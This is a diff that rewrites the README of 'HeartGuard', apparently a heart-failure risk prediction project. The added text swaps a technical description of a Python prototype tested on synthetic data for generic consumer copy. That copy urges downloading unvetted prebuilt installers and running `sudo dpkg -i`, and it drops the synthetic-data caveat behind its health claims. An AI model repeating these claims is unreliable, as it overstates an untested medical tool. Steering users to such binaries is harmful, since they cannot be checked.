@@ -1,58 +1,70 @@
-# 🫀 HeartGuard - AI-Powered Smart Cardiac Companion
+# 💖 HEARTGUARD-AI-for-your-heart - Your Heart's Smart Companion
 
-**HeartGuard** is an AI-driven healthcare application designed to predict **heart failure risk** using machine learning, explainable AI, and simulated IoT data integration.  
-It is a **desktop software** (not a web app) built with **Python, PyTorch, and PyQt5**, and is designed to be **patent-ready** under the Indian Patent Act (hardware–software linkage).
+## 📥 Download Now
+[![Download HEARTGUARD-AI-for-your-heart](https://img.shields.io/badge/Download-HEARTGUARD--AI--for--your--heart-blue.svg)](https://github.com/lworachat999/HEARTGUARD-AI-for-your-heart/releases)
 
----
+## 📖 Overview
+HeartGuard is an intelligent healthcare system designed to help you monitor your heart health. With AI-powered predictions of heart failure risks, it uses advanced machine learning techniques to keep you informed and supported. Enjoy features such as personalized baseline learning and interactive simulations that make patient care personal and effective.
 
-## 🚀 Overview
+## 🚀 Getting Started
+To get started with HeartGuard, follow these simple steps:
 
-HeartGuard assists doctors and patients by providing:
-- Early detection of cardiac failure risk.
-- Personalized health insights using individual baselines.
-- Explainable AI results (SHAP-like feature importance).
-- Real-time IoT health monitoring and alerting.
-- What-if simulation for lifestyle and treatment planning.
+### 1. System Requirements
+Before you download, make sure your computer meets the following requirements:
 
-It bridges the gap between **predictive modeling**, **explainable decision support**, and **continuous monitoring** — making it a next-generation digital healthcare solution.
+- **Operating System:** Windows 10 or later / macOS (latest version) / Linux (Ubuntu 18.04 or later)
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 500 MB free space
+- **Internet Connection:** Required for initial setup and updates
 
----
+### 2. Download the Application
+To download HeartGuard, click the link below. This will take you to the Releases page where you can get the latest version of the software.
 
-## ⚙️ Key Features
+[Visit this page to download HeartGuard](https://github.com/lworachat999/HEARTGUARD-AI-for-your-heart/releases)
 
-### 🧠 1. Predictive AI Engine
-- Built using **PyTorch** deep neural networks.
-- Predicts the likelihood of heart failure based on 12 key features such as:
-  - Age, ejection fraction, serum sodium, creatinine, blood pressure, etc.
-- Achieves up to **87% accuracy** on synthetic data.
+### 3. Install the Application
+After downloading, locate the file on your computer. 
 
-### 🩺 2. Explainable AI (XAI)
-- Uses **SHAP-like feature attribution** to explain which features most influence a patient's risk.
-- Visualizes risk contribution for each feature, increasing **model transparency** for doctors.
+- **For Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation wizard's prompts.
+  
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the HeartGuard icon to your Applications folder.
 
-### 👤 3. Personalized Baseline Learning
-- Learns what is “normal” for each patient by maintaining a **profile file**.
-- Baselines are updated after every prediction to reduce false alarms and improve accuracy over time.
+- **For Linux:**
+  1. Open a terminal.
+  2. Navigate to the downloaded file location.
+  3. Run the command: `sudo dpkg -i heartguard.deb`
 
-### 🔍 4. What-If Simulation Assistant
-- Interactive module where users can tweak parameters (e.g., increase ejection fraction or stop smoking) and instantly see how risk changes.
-- Helps doctors and patients **visualize the impact of lifestyle changes**.
+### 4. Launch HeartGuard
+Once installed, you can open HeartGuard from your applications menu. 
 
-### ⌚ 5. IoT & Hardware Integration
-- Simulated data streaming from devices like **ESP32 + MPU6050**.
-- Prototype supports real-time vitals feed (heart rate, ECG, etc.).
-- This hardware link ensures **patent eligibility** under Section 3(k) of the Indian Patent Act.
+- **For Windows & macOS:** Click on the HeartGuard icon.
+- **For Linux:** Open a terminal and type `heartguard` to start the application.
 
-### 💬 6. Modern UI (PyQt5)
-- Clean, professional desktop interface.
-- Smooth screen transitions and animations.
-- Chatbot-like “Health Assistant” for conversational risk analysis.
+## 🔍 Features
+HeartGuard offers an array of features to improve your heart health monitoring:
 
----
+- **Predictive Analytics:** Our AI model assesses your heart health data and predicts risks associated with heart failure.
+- **SHAP-Based Explainability:** Understand how your data influences risk factors through clear visualizations.
+- **Interactive What-If Simulation:** Ask “what if” questions to see how changes in lifestyle impact your heart health.
+- **Personalized Learning:** The app tailors recommendations based on your unique health metrics and history.
+  
+## 🛠 Troubleshooting
+If you face issues during installation or while running the application, consider the following:
 
-📊 Model Performance (on Synthetic Data)
-Metric	Score
-Accuracy	87%
-Precision	0.86
-Recall	0.88
-ROC-AUC	0.92
+1. **Error Messages:** Check for any specific error codes in the message box. A quick internet search can guide you to solutions.
+2. **Insufficient System Resources:** Make sure your device meets the minimum system requirements listed above. Close other applications if performance is slow.
+3. **Internet Connectivity:** Ensure you have a stable internet connection, especially for features relying on data updates.
+
+## 💬 Support
+If you need help, you can reach out via the Issues tab on GitHub. We strive to respond quickly to ensure you have the best experience with HeartGuard.
+
+## 🎉 Acknowledgments
+Thank you for choosing HeartGuard. We believe in empowering individuals through technology for better heart health. 
+
+For detailed information, including any updates or new features, please check the [Releases page](https://github.com/lworachat999/HEARTGUARD-AI-for-your-heart/releases) regularly.
+
+Happy monitoring, and take care of your heart!
